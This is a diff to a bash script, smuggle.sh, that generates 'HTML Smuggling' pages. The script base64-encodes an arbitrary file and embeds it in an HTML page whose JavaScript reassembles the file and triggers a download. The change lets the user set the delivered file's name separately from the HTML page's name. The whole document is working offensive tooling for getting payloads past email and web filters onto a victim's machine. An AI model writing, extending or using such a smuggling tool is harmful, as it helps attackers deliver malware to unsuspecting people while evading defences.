@@ -7,6 +7,7 @@ file="$1"
 create_html_file() {
     local b64="$1"
     local file_name="$2"
+    local html_name="$3"
     local content="<!DOCTYPE html>
 <html>
     <head>
@@ -27,7 +28,7 @@ create_html_file() {
         var file = '$b64';
         var data = convertFromBase64(file);
         var blob = new Blob([data], {type: 'octet/stream'});
-        var fileName = 'demo.zip';
+        var fileName = '$file_name';
 
         if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
         else {
@@ -44,30 +45,31 @@ create_html_file() {
     </body>
 </html>"
 
-    echo "$content" > "$file_name.html"
-    echo "HTML Smuggling file '$file_name.html' created successfully!"
+    echo "$content" > "$html_name.html"
+    echo "HTML Smuggling file '$html_name.html' created successfully!"
 }
 
 # Check if a filename is provided as an argument or using -o option
 if [ $# -eq 0 ]; then 
-    echo "Usage:"
-    echo "./smuggle.sh <file> <filename>"
-    echo "./smuggle.sh <file> -o <filename>"
+    echo "Usage: ./smuggle.sh <file> -f <filename to be downloaded> -o <html filename>"
     exit 0
 elif [ $# -eq 1 ]; then
-    # Default filename
-    file_name="smuggle"
+    # Default name
+    html_name="smuggle"
+    file_name="$file"
+elif [ "$2" = "-f" ] && [ "$4" = "-o" ] && [ $# -ge 5 ]; then
+    html_name="$5"
+    file_name="$3"
+elif [ "$2" = "-f" ] && [ $# -ge 3 ]; then
+    html_name="smuggle"
+    file_name="$3"
 else
-    # Check if -o option is used and get the custom filename
-    if [ "$2" = "-o" ] && [ $# -ge 3 ]; then
-        file_name="$3"
-    else
-        file_name="$2"
-    fi
+    echo "Invalid arguments!"
+    exit 1
 fi
 
 #transform the file to b64
 b64=$(cat "$file" | base64 | tr -d '\n')
 
 #Call the function to create the HTML file
-create_html_file "$b64" "$file_name"
+create_html_file "$b64" "$file_name" "$html_name"
